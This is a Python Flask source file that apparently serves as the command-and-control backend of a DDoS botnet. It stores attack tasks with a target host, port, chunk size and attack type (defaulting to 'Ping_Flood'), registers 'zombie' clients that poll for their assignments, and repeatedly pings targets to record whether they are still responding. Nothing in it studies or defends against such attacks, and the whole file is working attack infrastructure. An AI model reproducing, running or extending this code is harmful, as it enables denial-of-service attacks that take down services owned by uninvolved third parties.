import os
from random import randint
import json
import time
import datetime
import threading

import requests
from flask import Flask, request, jsonify, session
from flask_cors import CORS, cross_origin
from flask_sqlalchemy import SQLAlchemy


app = Flask(__name__)
CORS(app)

if os.path.exists(os.path.join(os.getcwd(), "config.py")):
    app.config.from_pyfile(os.path.join(os.getcwd(), 'config.py'))
else:
    app.config.from_pyfile(os.path.join(os.getcwd(), 'config.env.py'))

db = SQLAlchemy(app)

# Disable SSL certificate verification warning
requests.packages.urllib3.disable_warnings()

# Disable SQLAlchemy modification tracking
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False


class Task(db.Model):
    __tablename__ = 'tasks'

    uid = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String)
    target = db.Column(db.String)
    port = db.Column(db.Integer)
    chunksize = db.Column(db.Integer)
    active = db.Column(db.Integer)
    attack_type = db.Column(db.String)

    def __init__(self, uid, name, target, port, chunksize, active, attack_type):
        self.uid = uid
        self.name = name
        self.target = target
        self.port = port
        self.chunksize = chunksize
        self.active = active
        self.attack_type = attack_type


class Client(db.Model):
    __tablename__ = 'clients'

    uid = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String)
    task_id = db.Column(db.Integer)
    active = db.Column(db.Integer)
    last_online = db.Column(db.DateTime)

    def __init__(self, uid, name, task_id, active, last_online):
        self.uid = uid
        self.name = name
        self.task_id = task_id
        self.active = active
        self.last_online = last_online


class Setting(db.Model):
    __tablename__ = "settings"

    name = db.Column(db.String, primary_key=True)
    value = db.Column(db.String)

    def __init__(self, name, value):
        self.name = name
        self.value = value


class Uptime(db.Model):
    __tablename__ = "uptime_monitor"

    id = db.Column(db.Integer, primary_key=True)
    task_id = db.Column(db.Integer)
    data_type = db.Column(db.Integer)
    time = db.Column(db.BigInteger)
    value = db.Column(db.Integer)

    def __init__(self, task_id, data_type, time, value):
        self.task_id = task_id
        self.data_type = data_type
        self.time = time
        self.value = value


@app.before_first_request
def activate_job():
    def get_task_response_times():
        """
        Runs every couple of minutes, pings every host for task, records the
        response times in the uptime_monitor database.

        Value 'monitor_interval' in settings specifies number of seconds between
        response measuring

        Value 'max_responses_displayed' specifies the maximum number of
        responses that should be displayed on the frontend

        Value 'max-responses_recorded' specifies the maximum number of
        responses that should be recorded in the database.
        """
        # If monitor_interval setting is set, use the associated value
        if Setting.query.filter_by(name="monitor_interval").first():
            refresh_time = return_setting_json(Setting.query.filter_by(name="monitor_interval").first())['value']
            refresh_time = int(refresh_time)
        else:
            refresh_time = 600
        threading.Timer(refresh_time, get_task_response_times).start()
        tasks = parse_task_as_list(Task.query.all())
        # For every task, do some stuff
        for task in tasks:
            # Prepend with http, this works for now but needs to be replaced
            if task['target'][0:4].lower() != "http":
                target = "http://" + task['target']
            else:
                target = task['target']
            # Log response time, if unsuccessful set response time to -1
            try:
                ping_time = requests.get(target, headers={'Cache-Control': 'no-cache'}).elapsed.total_seconds() * 1000
            except:
                ping_time = -1
            # Create new response log
            new_uptime = Uptime(task_id=task['uid'],
                                data_type=1,
                                time=int(time.time()),
                                value=ping_time)
            # Get number of response logs to see if we have too many logs
            num = Uptime.query.filter_by(task_id=task['uid']).count()
            # Also get maximum number of allowed entries... 0 = infinite
            if Setting.query.filter_by(name="max_responses_recorded").first():
                max_responses_recorded = int(return_setting_json(Setting.query.filter_by(name="max_responses_recorded").first())['value'])
            else:
                max_responses_recorded = 1000
            # While the number of logs is greater than the allowed number,
            # delete the oldest
            while (num > max_responses_recorded) and (max_responses_recorded != 0):
                to_delete = Uptime.query.filter_by(task_id=task['uid']).order_by(Uptime.time.asc()).first()
                db.session.delete(to_delete)
                db.session.flush()
                db.session.commit()
                num = Uptime.query.filter_by(task_id=task['uid']).count()
            # Finally add the new response log
            db.session.add(new_uptime)
            db.session.flush()
            db.session.commit()
    get_task_response_times()


@app.route('/', methods=['GET'])
def test():
    """
    Update this to return some pretty documentation
    """
    return "dicks..."


@app.route('/clients', methods=['GET', 'PUT'])
def all_clients():
    """
    :GET: returns all clients and their respective data
    :PUT: creates a client object, adds it to the database, and returns it
    """
    if request.method == 'GET':
        return parse_client_as_json(Client.query.all())
    elif request.method == 'PUT':
        name = request.args.get('name')
        task_id = request.args.get('task_id')
        if request.args.get('active'):
            active = request.args.get('active')
        else:
            active = 1

        # Create uuid
        uid = randint(0, 999999999)
        while not is_client_key_unique(uid):
            uid = randint(0, 999999999)

        # Create last_online date
        last_online = time.strftime('%Y-%m-%d %H:%M:%S')

        # Add client to database
        new_client = Client(uid=uid,
                            name=name,
                            task_id=task_id,
                            active=active,
                            last_online=last_online)
        db.session.add(new_client)
        db.session.flush()
        db.session.commit()
        return jsonify(uid), 201


@app.route('/tasks', methods=['GET', 'PUT'])
def all_tasks():
    """
    :GET: returns all tasks and their respective data
    :PUT: creates a task
    """
    if request.method == 'GET':
        return parse_task_as_json(Task.query.all()), 200
    elif request.method == 'PUT':
        # Get Parameters
        name = request.args.get('name')
        target = request.args.get('target')
        port = request.args.get('port')
        chunksize = request.args.get('chunksize')
        active = request.args.get('active')
        attack_type = request.args.get('attack_type')

        if not name:
            name = "N/A"
        if not target:
            target = "127.0.0.1"
        if not port:
            port = 53
        if not chunksize:
            chunksize = 1000
        if not active:
            active = 0
        if not attack_type:
            attack_type = "Ping_Flood"

        # Create uuid
        uid = randint(0, 999999999)
        while not is_task_key_unique(uid):
            uid = randint(0, 999999999)

        # Add New Task
        new_task = Task(uid=uid,
                        name=name,
                        target=target,
                        port=port,
                        chunksize=chunksize,
                        active=active,
                        attack_type=attack_type)
        db.session.add(new_task)
        db.session.flush()
        db.session.commit()
        return jsonify(return_task_json(new_task)), 201


@app.route('/tasks/<uid>', methods=['GET', 'PUT', 'DELETE'])
def singular_task(uid):
    """
    :param uid: unique ID of a task
    :GET: gets data for task identified by UID
    :PUT: modifies data for task identified by UID
    :DELETE: deletes task identified by UID
    """
    if request.method == 'GET':
        return jsonify(return_task_json(Task.query.filter_by(uid=uid).first())), 200
    elif request.method == 'PUT':
        # Get Data for the matching task
        task = Task.query.filter_by(uid=uid).first()
        # Determine what data is in the PUT method, fill in the blanks
        if request.args.get('name'):
            task.name = request.args.get('name')
        if request.args.get('target'):
            task.target = request.args.get('target')
        if request.args.get('port'):
            task.port = request.args.get('port')
        if request.args.get('chunksize'):
            task.chunksize = request.args.get('chunksize')
        if request.args.get('active'):
            task.active = request.args.get('active')
        if request.args.get('attack_type'):
            task.attack_type = request.args.get('attack_type')

        # Perform update
        db.session.flush()
        db.session.commit()
        return jsonify(return_task_json(task)), 201
    elif request.method == 'DELETE':
        Task.query.filter_by(uid=uid).delete()
        db.session.flush()
        db.session.commit()
        return "Success", 200


@app.route('/clients/<uid>', methods=['GET', 'PUT', 'DELETE'])
def singular_client(uid):
    """
    :param uid: unique ID for client
    :GET: returns data for client identified by UID
    :PUT: modifies specified data for client identified by UID
    :DELETE: deletes client specified by UID
    """
    if request.method == 'GET':
        client = Client.query.filter_by(uid=uid).first()
        if client:
            return jsonify(return_client_json(client)), 200
        else:
            return "Invalid Client", 404
    elif request.method == 'PUT':
        # Get data for referenced client
        client = Client.query.filter_by(uid=uid).first()

        # Determine what is being changed
        if request.args.get('name'):
            client.name = request.args.get('name')
        if request.args.get('task_id'):
            client.task_id = request.args.get('task_id')
        if request.args.get('active'):
            client.active = request.args.get('active')
        if request.args.get('last_online'):
            client.last_online = request.args.get('last_online')

        # Perform update
        db.session.flush()
        db.session.commit()
        return jsonify(return_client_json(client)), 201
    elif request.method == 'DELETE':
        Client.query.filter_by(uid=uid).delete()
        db.session.flush()
        db.session.commit()
        return "Success", 200


@app.route('/clients/<uid>/toggle', methods=['PUT'])
def toggle_active(uid):
    """
    Toggles the "active" element of the client specified by UID
    :param uid: identifier for client to toggle the activity of
    :return: client object
    """
    client = Client.query.filter_by(uid=uid).first()

    if not client.active:
        client.active = 1
    else:
        client.active = 0

    db.session.flush()
    db.session.commit()
    return jsonify(return_client_json(client)), 201


@app.route('/tasks/<uid>/toggle', methods=['PUT'])
def task_toggle_active(uid):
    """
    Toggles the "active" element of the task specified by UID
    :param uid: identifier for task to toggle activity of
    :return: task object
    """
    task = Task.query.filter_by(uid=uid).first()

    if not task.active:
        task.active = 1
    else:
        task.active = 0

    db.session.flush()
    db.session.commit()
    return jsonify(return_task_json(task)), 201


@app.route('/<zombie_uid>', methods=['GET'])
def get_zombie_assignment(zombie_uid):
    """
    Zombie-specific endpoint for the zombie clients.
    Returns the object associated with that zombie/client, and also updates
    the last_online time in the database.
    :param zombie_uid: UID of the zombie trying to connect
    :return: json object with zombie-specific data
    """
    client = Client.query.filter_by(uid=zombie_uid).first()
    if client:
        ts = time.time()
        last_online = datetime.datetime.fromtimestamp(ts).strftime('%m/%d/%Y %I:%M:%S %p')
        client.last_online = last_online
        db.session.flush()
        db.session.commit()
        return jsonify(return_client_json(client)), 200
    else:
        return "Invalid Client", 404


@app.route('/settings', methods=['GET', 'PUT'])
def settings():
    """
    :GET: Gets all settings and their associated values
    :PUT: Requires 'name' and 'value' request arguments, which create a new
            setting with name 'name' and value 'value'
    """
    if request.method == 'GET':
        return parse_settings_as_json(Setting.query.all()), 200
    elif request.method == 'PUT':
        name = request.args.get('name')
        value = request.args.get('value')
        setting = Setting.query.filter_by(name=name).first()
        if not setting:
            # If there are no settings with a matching name
            if not name:
                return ""
            new_setting = Setting(name, value)
            db.session.add(new_setting)
            db.session.flush()
            db.session.commit()
            return jsonify(return_setting_json(new_setting)), 201
        else:
            setting.value = value
            db.session.flush()
            db.session.commit()
            return jsonify(return_setting_json(setting)), 201


@app.route('/settings/<name>', methods=['GET', 'PUT', 'DELETE'])
def setting(name):
    """
    :GET: Access a specific setting by name
    :PUT: Requires request argument 'value' and creates a setting with <name>
    :DELETE: deletes setting with <name>
    """
    if request.method == 'GET':
        setting = Setting.query.filter_by(name=name).first()
        if not setting:
            return "Invalid Setting", 404
        else:
            return jsonify(return_setting_json(setting)), 200
    elif request.method == 'PUT':
        value = request.args.get('value')
        setting = Setting.query.filter_by(name=name).first()
        if not setting:
            new_setting = Setting(name, value)
            db.session.add(new_setting)
            db.session.flush()
            db.session.commit()
            return jsonify(return_setting_json(new_setting)), 201
        else:
            setting.value = value
            db.session.flush()
            db.session.commit()
            return jsonify(return_setting_json(setting)), 201
    elif request.method == 'DELETE':
        Setting.query.filter_by(name=name).delete()
        db.session.flush()
        db.session.commit()
        return "Successfully Deleted", 202


@app.route('/uptimes', methods=['GET'])
def get_latest_response_time():
    """
    Returns latest response time for each task
    """
    tasks = parse_task_as_list(Task.query.all())
    return latest_uptime_json(tasks), 200


@app.route('/uptimes/<task_id>', methods=['GET', 'PUT'])
def get_data(task_id):
    """
    Returns all uptime data for the task associated with <task_id>
    """
    if request.method == 'GET':
        uptime = Uptime.query.filter_by(task_id=task_id)
        if (uptime):
            return parse_uptimes_as_json(uptime), 200
        else:
            return "Task Doesn't Exist!", 404


def parse_uptime(uptime):
    """
    Returns an uptime object
    """
    return {
        'task_id':uptime.task_id,
        'data_type':uptime.data_type,
        'time':uptime.time,
        'value':uptime.value,
    }


def latest_uptime_json(tasks : list):
    """
    Accepts a Task query and returns the latest time to ping each host, time
    pulled from the uptime_monitor database
    """
    return_val = []
    for task in tasks:
        uptime = Uptime.query.filter_by(task_id=task["uid"]).order_by(Uptime.time.desc()).first()
        print(parse_uptime(uptime))
        return_val.append(parse_uptime(uptime))
    return jsonify(return_val)


def parse_uptimes_as_json(uptimes: list):
    """
    Accepts a list of uptimes and then translates it to a jsonified list of
    uptime objects
    :param uptimes: uptimes to transform
    :return: list of uptime objects
    """
    return_val = [];
    for uptime in uptimes:
        return_val.append(parse_uptime(uptime))
    return jsonify(return_val)


def parse_uptimes_as_list(uptimes: list):
    """
    Accepts a list of uptimes and then translates it to a jsonified list of
    uptime objects
    :param uptimes: uptimes to transform
    :return: list of uptime objects
    """
    return_val = [];
    for uptime in uptimes:
        return_val.append(parse_uptime(uptime))
    return return_val


def parse_settings_as_json(settings: list):
    """
    Returns json list of all Settings passed to this function
    :param settings: settings query, list format
    :return: json list of Setting objects
    """
    return_val = []
    for setting in settings:
        return_val.append(return_setting_json(setting))
    return jsonify(return_val)


def return_setting_json(setting):
    """
    Returns a Setting object
    """
    return {
        'name':setting.name,
        'value':setting.value,
    }


def parse_task_as_json(tasks: list):
    """
    Accepts a list of tasks and then translates it to a jsonified list of
    task objects
    :param tasks: tasks to transform
    :return: list of task objects
    """
    json = []
    for task in tasks:
        json.append(return_task_json(task))
    return jsonify(json)


def parse_task_as_list(tasks: list):
    """
    Accepts a list of tasks and then translates it to a list of task objects
    :param tasks: tasks to transform
    :return: list of task objects
    """
    json = []
    for task in tasks:
        json.append(return_task_json(task))
    return json


def return_task_json(task):
    """
    Accepts a task and turns it into a json object
    :param task: task
    :return: task object
    """
    return {
        'uid': task.uid,
        'name': task.name,
        'target': task.target,
        'port': task.port,
        'chunksize': task.chunksize,
        'active': task.active,
        'attack_type': task.attack_type,
    }


def parse_client_as_json(clients: list):
    """
    Accepts a list of clients and then translates it to a jsonified list of
    client objects
    :param clients: clients to transform
    :return: list of clients objects
    """
    json = []
    for client in clients:
        json.append(return_client_json(client))
    return jsonify(json)


def return_client_json(client):
    """
    Accepts a client and turns it into a json object
    :param client: task
    :return: client object
    """
    return {
        'uid': client.uid,
        'name': client.name,
        'task_id': client.task_id,
        'active': client.active,
        'last_online': client.last_online,
    }


def is_task_key_unique(key):
    """
    Checks to see if a key exists in the task table
    :param key: key to check
    :return: true if key is unique, false otherwise
    """
    if Task.query.filter_by(uid=key).all():
        return False
    return True


def is_client_key_unique(key):
    """
    Checks to see if a key exists in the client table
    :param key: key to check existence of
    :return: true if key is unique, false otherwise
    """
    if Client.query.filter_by(uid=key).all():
        return False
    return True
